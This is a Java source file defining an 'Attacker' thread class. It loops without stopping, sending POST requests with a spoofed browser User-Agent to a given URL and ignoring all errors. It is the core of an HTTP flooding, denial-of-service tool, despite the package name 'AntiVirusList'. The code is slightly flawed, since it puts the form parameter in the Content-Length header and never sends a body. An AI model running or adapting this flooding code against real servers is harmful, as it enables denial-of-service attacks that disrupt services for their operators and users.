package AntiVirusList;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;


class Attacker extends Thread{




        private AtomicBoolean running = new AtomicBoolean(true);
        private  String request ;
        private  URL url;

        String param = null;






    public Attacker(String request) throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
            this.request = request;
        }




    public String getRequest() {
        return request;
    }

    public void setRequest(String request) {
        this.request = request;
    }


        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {

                }


            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();

        }

    }

